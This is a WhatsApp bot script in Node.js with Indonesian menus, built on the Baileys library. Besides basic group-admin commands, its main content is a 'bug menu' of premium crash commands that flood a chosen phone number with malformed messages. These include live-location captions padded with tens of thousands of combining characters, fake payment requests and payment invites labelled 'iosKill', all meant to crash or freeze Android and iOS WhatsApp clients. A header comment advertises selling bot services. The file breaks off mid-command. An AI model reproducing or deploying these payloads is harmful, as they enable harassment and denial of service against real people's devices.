//Gunakan lah script ini dengan bijak kawan, Buat kalian yang mau buy kebutuhan bot sepeti panel dll bisa pm wa saya 082332790754 ( LaxxyOffc)

require('./settings')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { exec, spawn, execSync } = require("child_process")
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./database/functions')
module.exports = LaxzyMods = async (LaxzyMods, m, chatUpdate, store, akses, owner) => {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : '.'
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const NumberId = await LaxzyMods.decodeJid(LaxzyMods.user.id)
const isDeveloper = [...devNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [NumberId, ...akses].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await LaxzyMods.groupMetadata(m.chat).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(NumberId) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const tanggal = (numer) => {
	myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
				myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu']; 
				var tgl = new Date(numer);
				var day = tgl.getDate()
				bulan = tgl.getMonth()
				var thisDay = tgl.getDay(),
				thisDay = myDays[thisDay];
				var yy = tgl.getYear()
				var year = (yy < 1000) ? yy + 1900 : yy; 
				const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				
				return`${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const log = console.log

if (!LaxzyMods.public) {
if (!m.key.fromMe) return
}

if (command){
LaxzyMods.readMessages([m.key])
const pref = m.isGroup ? "Dalam Grup" : "Privat Chat"
log('  ')
log(chalk`{bold {yellowBright cmd} -> {cyan ${command}} | Oleh -> {green ${pushname}} | Di {yellow ${pref}} | Pesan -> {red ${body}}}`)
}
	
function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = LaxzyMods.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = LaxzyMods.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}
let contextInfo = {
"mentionedJid": [m.sender],
"externalAdReply": {
"title": "𝔏𝔞𝔵𝔷𝔶𝔶𝔬𝔣𝔣𝔠", 
'body': " Laxxy v1.5",
"mediaType": 1,
"thumbnail":  fs.readFileSync('./database/laxy.jpg'),
"sourceUrl": `https://youtube.com/@laxzymods` }}

function sendImage(path, txt){
LaxzyMods.sendMessage(from, {image: fs.readFileSync(path), caption: txt, contextInfo: contextInfo}, {quoted: m})
}

const sendContact = (jid, number, quoted, mn) => {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + devNumber + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + devNumber + ':+' + devNumber + '\n'
+ 'END:VCARD'
let list = [{ vcard }]
for (let i of number) {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + i + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + i + ':+' + i + '\n'
+ 'END:VCARD'
list.push({ vcard })}
return LaxzyMods.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, mentions : mn ? mn : []},{ quoted: quoted })
}


const reply = (teks) => { LaxzyMods.sendMessage(m.chat, { text: teks, contextInfo: contextInfo }, { quoted: m }) }
//

const laxzyMods = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./database/xLayDos.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ཱིⱠ₳ӾӾɎØ₣₣₵🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}


async function iosKill(target) {
await LaxzyMods.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

//=================================================//
const modsLaxxy = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./database/xLayDos.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ཱིⱠ₳ӾӾɎØ₣₣₵🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//
async function bugLocation(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ཱིⱠ₳ӾӾɎØ₣₣₵🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await LaxzyMods.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//

const bugLinsYt = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(m.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  },
  'message': {
    "interactiveMessage": {
      "header": {
        "hasMediaAttachment": true,
        "jpegThumbnail": fs.readFileSync(`./database/xLayDos.png`)
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "review_and_pay",
            "buttonParamsJson": `{
              "currency": "IDR",
              "total_amount": {
                "value": 49981399788,
                "offset": 100
              },
              "reference_id": "4OON4PX3FFJ",
              "type": "physical-goods",
              "order": {
                "status": "payment_requested",
                "subtotal": {
                  "value": 49069994400,
                  "offset": 100
                },
                "tax": {
                  "value": 490699944,
                  "offset": 100
                },
                "discount": {
                  "value": 485792999999,
                  "offset": 100
                },
                "shipping": {
                  "value": 48999999900,
                  "offset": 100
                },
                "order_type": "ORDER",
                "items": [
                  {
                    "retailer_id": "7842674605763435",
                    "product_id": "7842674605763435",
                    "name": "ཱིⱠ₳ӾӾɎØ₣₣₵🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི BUG GANASS FC CRASH",
                    "amount": {
                      "value": 9999900,
                      "offset": 100
                    },
                    "quantity": 7
                  },
                  {
                    "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                    "name": "",
                    "amount": {
                      "value": 999999900,
                      "offset": 100
                    },
                    "quantity": 49
                  }
                ],
                "native_payment_methods": []
              }
            }`
          }
        ]
      }
    }
  }
};


async function bugLinsFc(target) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      "liveLocationMessage": {
        "degreesLatitude": "p",
        "degreesLongitude": "p",
        "caption": "ཱིⱠ₳ӾӾɎØ₣₣₵🔥ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི".repeat(50000),
        "sequenceNumber": "0",
        "jpegThumbnail": ""
         }
      }
    }
}), { userJid: target, quoted: bugLinsYt })
await LaxzyMods.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function mmgLins(target) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
        "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
        "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
        "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
        "fileLength": "10116",
        "mediaKeyTimestamp": "1715876003",
        "isAnimated": false,
        "stickerSentTs": "1715881084144",
        "isAvatar": false,
        "isAiSticker": false,
        "isLottie": false
      }
}), { userJid: target, quoted: bugLinsYt });
await LaxzyMods.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

switch (command) {
//▬▭▬▭▬▭▬▭▬[ AWAL ]▬▭▬▭▬▭▬▭▬//
case 'menu':{
let simbol = "» "
let teks = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
┏━━━━━━━━━━━━━━━━━━━━━
┃  ════╾𝙄𝙉𝙁𝙊 𝘽𝙊𝙏𝙕╼═════
┃ク 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙆𝙚𝙣𝙣
┃ク 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : ${namebot}
┃ク 𝐎𝐰𝐧𝐞𝐫𝐍𝐮𝐦𝐛𝐞𝐫 : ${devNumber}
┃ク 𝐒𝐭𝐚𝐭𝐮𝐬 : Online
┃
┃  ════╾𝐋𝐈𝐒𝐓𝐌𝐄𝐍𝐔╼═════
┃ク 𝘽𝙪𝙜𝙢𝙚𝙣𝙪
┃ク 𝘽𝙪𝙜𝙢𝙚𝙣𝙪𝙑2
┃ク 𝙊𝙬𝙣𝙚𝙧𝙢𝙚𝙣𝙪
┃ク 𝙂𝙧𝙤𝙪𝙥𝙢𝙚𝙣𝙪
┗━━━━━━━━━━━━━━━━━━━━━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©𝙆𝙚𝙣𝙣
`.trim()
sendImage("./database/menu.jpg", teks)
}
break
case 'bugmenu':{
let simbol = "» "
let teks = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
┏━━━━━━━━━━━━━━━━━━━━━
┃  ════╾𝙄𝙉𝙁𝙊 𝘽𝙊𝙏𝙕╼═════
┃ク 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙆𝙚𝙣𝙣
┃ク 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : ${namebot}
┃ク 𝐎𝐰𝐧𝐞𝐫𝐍𝐮𝐦𝐛𝐞𝐫 : ${devNumber}
┃ク 𝐒𝐭𝐚𝐭𝐮𝐬 : Online
┃
┃  ════╾𝗕𝘂𝗴𝗺𝗲𝗻𝘂╼═════
┃៚𝘽𝙪𝙜 𝘼𝙣𝙙𝙧𝙤𝙞𝙙
┃ク crashandro ➳𝟔𝟐𝟎𝟎𝟎
┃ク lagandro ➳𝟔𝟐𝟎𝟎𝟎
┃ク gasandro ➳𝟔𝟐𝟎𝟎𝟎
┃ク delayandro ➳𝟔𝟐𝟎𝟎𝟎
┃ク x_andro ➳𝟔𝟐𝟎𝟎𝟎
┃
┃៚𝘽𝙪𝙜 𝙄𝙥𝙤𝙣𝙜
┃ク craship ➳𝟔𝟐𝟎𝟎𝟎
┃ク bomm-ip ➳𝟔𝟐𝟎𝟎𝟎
┃ク bantai-ip ➳𝟔𝟐𝟎𝟎𝟎
┃
┗━━━━━━━━━━━━━━━━━━━━━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©𝙆𝙚𝙣𝙣
`.trim()
reply(teks)
}
break
case 'bugmenuv2':{
let simbol = "» "
let teks = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
┏━━━━━━━━━━━━━━━━━━━━━
┃  ════╾𝙄𝙉𝙁𝙊 𝘽𝙊𝙏𝙕╼═════
┃ク 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙆𝙚𝙣𝙣
┃ク 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : ${namebot}
┃ク 𝐎𝐰𝐧𝐞𝐫𝐍𝐮𝐦𝐛𝐞𝐫 : ${devNumber}
┃ク 𝐒𝐭𝐚𝐭𝐮𝐬 : Online
┃
┃  ════╾𝗕𝘂𝗴𝗺𝗲𝗻𝘂V2╼═════
┃៚𝘽𝙪𝙜 𝙃𝙖𝙧𝙙
┃ク crash ➳𝟔𝟐𝟎𝟎𝟎
┃ク offc ➳𝟔𝟐𝟎𝟎𝟎
┃ク sikat ➳𝟔𝟐𝟎𝟎𝟎
┃ク perkosa ➳𝟔𝟐𝟎𝟎𝟎
┃ク kocok ➳𝟔𝟐𝟎𝟎𝟎
┃ク turu ➳𝟔𝟐𝟎𝟎𝟎
┃ク santet ➳𝟔𝟐𝟎𝟎𝟎
┃ク virtexbrutal ➳𝟔𝟐𝟎𝟎𝟎
┃ク gasken ➳𝟔𝟐𝟎𝟎𝟎
┃ク laxx ➳𝟔𝟐𝟎𝟎𝟎
┃ク brutall ➳𝟔𝟐𝟎𝟎𝟎
┃ク troli ➳𝟔𝟐𝟎𝟎𝟎
┃ク restart ➳𝟔𝟐𝟎𝟎𝟎
┃ク laxxynidek ➳𝟔𝟐𝟎𝟎𝟎
┃
┃៚𝘽𝙪𝙜 𝙀𝙢𝙤𝙟𝙞
┃ク 🥶 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🤓 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🗿 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 👿 ➳𝟔𝟐𝟎𝟎𝟎
┃ク ☕ ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🤡 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 😜 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🦁 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🔥 ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🤤 ➳𝟔𝟐𝟎𝟎𝟎
┃ク ☠️ ➳𝟔𝟐𝟎𝟎𝟎
┃ク 🌷 ➳𝟔𝟐𝟎𝟎𝟎
┃
┗━━━━━━━━━━━━━━━━━━━━━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©𝙆𝙚𝙣𝙣
`.trim()
reply(teks)
}
break
case 'ownermenu':{
let simbol = "» "
let teks = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
┏━━━━━━━━━━━━━━━━━━━━━
┃  ════╾𝙄𝙉𝙁𝙊 𝘽𝙊𝙏𝙕╼═════
┃ク 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙆𝙚𝙣𝙣
┃ク 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : ${namebot}
┃ク 𝐎𝐰𝐧𝐞𝐫𝐍𝐮𝐦𝐛𝐞𝐫 : ${devNumber}
┃ク 𝐒𝐭𝐚𝐭𝐮𝐬 : Online
┃
┃  ════╾𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮╼═════
┃ク 𝙖𝙙𝙙𝙥𝙧𝙚𝙢 62𝙭𝙭𝙭/𝙩𝙖𝙜@
┃ク 𝙙𝙚𝙡𝙡𝙥𝙧𝙚𝙢 62𝙭𝙭𝙭/𝙩𝙖𝙜@
┃ク 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 62𝙭𝙭𝙭/𝙩𝙖𝙜@
┃ク 𝙥𝙪𝙗𝙡𝙞𝙘
┃ク 𝙨𝙚𝙡𝙛
┃
┗━━━━━━━━━━━━━━━━━━━━━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©𝙆𝙚𝙣𝙣
`.trim()
reply(teks)
}
break
case 'groupmenu':{
let simbol = "» "
let teks = `
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
┏━━━━━━━━━━━━━━━━━━━━━
┃  ════╾𝙄𝙉𝙁𝙊 𝘽𝙊𝙏𝙕╼═════
┃ク 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙇𝙖𝙭𝙭𝙮𝙊𝙛𝙛𝙘
┃ク 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : ${namebot}
┃ク 𝐎𝐰𝐧𝐞𝐫𝐍𝐮𝐦𝐛𝐞𝐫 : ${devNumber}
┃ク 𝐒𝐭𝐚𝐭𝐮𝐬 : Online
┃
┃  ════╾𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮╼═════
┃ク 𝙝𝙞𝙙𝙚𝙩𝙖𝙜
┃ク 𝙤𝙥𝙚𝙣
┃ク 𝙘𝙡𝙤𝙨𝙚
┃ク 𝙠𝙞𝙘𝙠
┃
┗━━━━━━━━━━━━━━━━━━━━━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©𝙆𝙚𝙣𝙣
`.trim()
reply(teks)
}
break
case 'self': {
if (!isDeveloper) return reply('untuk owner')
LaxzyMods.public = false
reply('Succes Change To Self')
}
break
case 'public': {
if (!isDeveloper) return reply('untuk owner')
LaxzyMods.public = true
reply('Succes Change To Public')
}
break
case 'kick': {
if (!isGroup) return reply("Khusus Grup")
if (!isBotAdmins) return reply("Jadikan Bot Admin")
if (!isGroupAdmins) return reply("Fitur Untuk Admin Grup")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LaxzyMods.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply('Done ✅')).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag':{
if (!isGroup) return reply("Khusus Grup")
if (!isGroupAdmins) return reply("Fitur Untuk Admin Grup")
let mem = [];
groupMembers.map( i => mem.push(i.id) )
LaxzyMods.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case 'open':{
if (!isGroup) return reply("Khusus Grup")
if (!isBotAdmins) return reply("Jadikan Bot Admin")
if (!isGroupAdmins) return reply("Fitur Untuk Admin Grup")
LaxzyMods.groupSettingUpdate(from, 'not_announcement').then((res) => reply("Success Grup Telah Dibuka")).catch((err) => reply(jsonformat(err)))
}
break
case 'close':{
if (!isGroup) return reply("Khusus Grup")
if (!isBotAdmins) return reply("Jadikan Bot Admin")
if (!isGroupAdmins) return reply("Fitur Untuk Admin Grup")
LaxzyMods.groupSettingUpdate(from, 'announcement').then((res) => reply("Success Grup Telah Ditutup")).catch((err) => reply(jsonformat(err)))
}
break

case 'crashandro': case 'lagandro': case 'gasandro': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 15; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'delayandro': case 'x_andro': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 15; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'craship': case 'bomm-ip': case 'bantai-ip': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 50; i++) {
iosKill(target)
bugLocation(target, laxzyMods)
await bugLinsFc(target)
await mmgLins(target) 
bugLocation(target, laxzyMods)
}
}
break
case 'crash': case 'offc': case 'sikat': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'perkosa': case 'kocok': case 'turu': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'santet': case 'virtexbrutal': case 'gasken': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'laxx': case 'brutall': case 'troli': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case 'restart': case 'laxxynidek': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case '🥶': case '🤓': case '🗿': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
